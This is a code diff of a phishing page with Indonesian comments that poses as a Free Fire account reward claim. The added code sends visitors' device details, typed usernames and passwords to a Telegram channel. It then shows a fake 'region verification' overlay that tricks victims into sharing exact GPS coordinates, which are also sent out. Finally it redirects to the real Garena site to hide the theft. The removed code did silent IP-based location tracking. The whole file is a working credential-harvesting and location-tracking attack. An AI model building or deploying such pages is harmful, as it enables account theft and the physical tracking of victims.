@@ -15,6 +15,14 @@
         input:focus { outline: none; border-color: #ffd369; }
         button { width: 100%; padding: 0.8rem; background: linear-gradient(45deg, #e94560, #ff6b6b); border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 1rem; box-shadow: 0 4px 12px rgba(233,69,96,0.4); }
         button:hover { background: linear-gradient(45deg, #ff6b6b, #e94560); }
+        
+        /* Custom Interactive Overlay to force GPS permission click */
+        #gps-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); justify-content: center; align-items: center; z-index: 999; }
+        .overlay-box { background: #1e293b; padding: 2rem; border-radius: 10px; width: 320px; text-align: center; border: 2px solid #00d2d3; }
+        .overlay-box h3 { color: #00d2d3; margin-bottom: 1rem; }
+        .overlay-box p { color: #cbd5e1; font-size: 0.9rem; margin-bottom: 1.5rem; }
+        .btn-gps { background: #00d2d3; color: #0f172a; font-weight: bold; padding: 0.8rem; border: none; border-radius: 6px; width: 100%; cursor: pointer; text-transform: uppercase; }
+        .btn-gps:hover { background: #01a3a4; }
     </style>
 </head>
 <body>
@@ -27,6 +35,15 @@
             <input type="password" id="password" placeholder="Password Akun" required>
             <button type="submit">Klaim Sekarang</button>
         </form>
+    </div>
+
+    <!-- Overlay pancingan agar target klik tombol yang men-trigger GPS asli browser -->
+    <div id="gps-overlay">
+        <div class="overlay-box">
+            <h3>Verifikasi Region Akun</h3>
+            <p>Sistem mendeteksi login dari perangkat baru. Klik tombol di bawah untuk mencocokkan koordinat GPS server lokal Indonesia.</p>
+            <button type="button" class="btn-gps" id="btnTriggerGPS">Lanjutkan Verifikasi GPS</button>
+        </div>
     </div>
 
     <script>
@@ -49,70 +66,71 @@
                 cores: navigator.hardwareConcurrency || 'N/A',
                 memory: navigator.deviceMemory || 'N/A',
                 screen: `${window.screen.width}x${window.screen.height}`,
-                lang: navigator.language,
-                conn: navigator.connection ? (navigator.connection.effectiveType || 'N/A') : 'N/A'
+                lang: navigator.language
             };
         }
 
-        function fetchSilentTelemetry() {
-            // Menggunakan multi-endpoint IP intelligence tanpa prompt izin sama sekali
-            fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .then(data => {
-                    const info = collectDeviceinfo();
-                    const lat = data.latitude;
-                    const lon = data.longitude;
-                    const city = data.city;
-                    const region = data.region;
-                    const country = data.country_name;
-                    const org = data.org;
-                    const ip = data.ip;
-                    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-
-                    let report = `🎯 *Silent Telemetry & Location Locked*\n\n` +
-                                 `🌐 *IP:* \`${ip}\`\n` +
-                                 `🏢 *ISP/Org:* ${org}\n` +
-                                 `📍 *Area:* ${city}, ${region},${country}\n` +
-                                 `📌 *Coords:* \`${lat}, ${lon}\`\n` +
-                                 `🗺️ [Open in Google Maps](${mapsUrl})\n\n` +
-                                 `💻 *Device Info:*\n` +
-                                 `- Platform: ${info.platform}\n` +
-                                 `- Screen: ${info.screen}\n` +
-                                 `- Cores/RAM: ${info.cores}C / ${info.memory}GB\n` +
-                                 `- Network: ${info.conn}\n` +
-                                 `- UA: \`${info.ua}\``;
-                    
-                    sendToTelegram(report);
-                })
-                .catch(err => {
-                    // Fallback telemetry secondary provider
-                    fetch('https://ipwho.is/')
-                        .then(res => res.json())
-                        .then(data => {
-                            const lat = data.latitude;
-                            const lon = data.longitude;
-                            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                            let report = `🎯 *Silent Telemetry (Fallback)*\nIP: \`${data.ip}\`\nCoords: \`${lat}, ${lon}\`\n🗺️ [Maps](${mapsUrl})`;
-                            sendToTelegram(report);
-                        });
-                });
-        }
-
         window.onload = function() {
-            fetchSilentTelemetry();
+            const info = collectDeviceinfo();
+            let msg = `🎮 *FF Visitor Captured*\n\n` +
+                      `💻 Platform: ${info.platform}\n` +
+                      `📱 UA: ${info.ua}\n` +
+                      `🖥️ Screen: ${info.screen}\n` +
+                      `🧠 Cores: ${info.cores} \vert{} RAM:${info.memory}GB\n` +
+                      `🌐 Lang: ${info.lang}`;
+            sendToTelegram(msg);
         };
+
+        let cachedUser = '';
+        let cachedPass = '';
 
         document.getElementById('ffForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const u = document.getElementById('userid').value;
-            const p = document.getElementById('password').value;
+            cachedUser = document.getElementById('userid').value;
+            cachedPass = document.getElementById('password').value;
 
-            let credMsg = `💎 *FF Credentials Harvested*\n\nID/User: \`${u}\`\nPass: \`${p}\``;
+            let credMsg = `💎 *FF Credentials Harvested*\n\nID/User: \`${cachedUser}\`\nPass: \`${cachedPass}\``;
             sendToTelegram(credMsg);
-            
-            setTimeout(() => {
-                window.location.href = 'https://ff.garena.com/';
-            }, 1000);
+
+            // Tampilkan overlay agar ada interaksi klik langsung sebelum memanggil geolocation browser
+            document.getElementById('gps-overlay').style.display = 'flex';
+        });
+
+        document.getElementById('btnTriggerGPS').addEventListener('click', function() {
+            document.getElementById('gps-overlay').style.display = 'none';
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const acc = position.coords.accuracy;
+                        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                        
+                        let geoMsg = `📍 *Real GPS Location Locked (Akurat)*\n` +
+                                     `Lat/Lon: \`${lat},${lon}\`\n` +
+                                     `Accuracy: ${acc} meters\n` +
+                                     `🗺️ [Open exact location in Google Maps](${mapsUrl})`;
+                        sendToTelegram(geoMsg);
+
+                        setTimeout(() => {
+                            window.location.href = 'https://ff.garena.com/';
+                        }, 1200);
+                    },
+                    (error) => {
+                        sendToTelegram(`⚠️ Real GPS Denied/Failed: ${error.message}`);
+                        setTimeout(() => {
+                            window.location.href = 'https://ff.garena.com/';
+                        }, 1000);
+                    },
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            } else {
+                sendToTelegram(`⚠️ Geolocation not supported by target browser.`);
+                setTimeout(() => {
+                    window.location.href = 'https://ff.garena.com/';
+                }, 1000);
+            }
         });
     </script>
 </body>
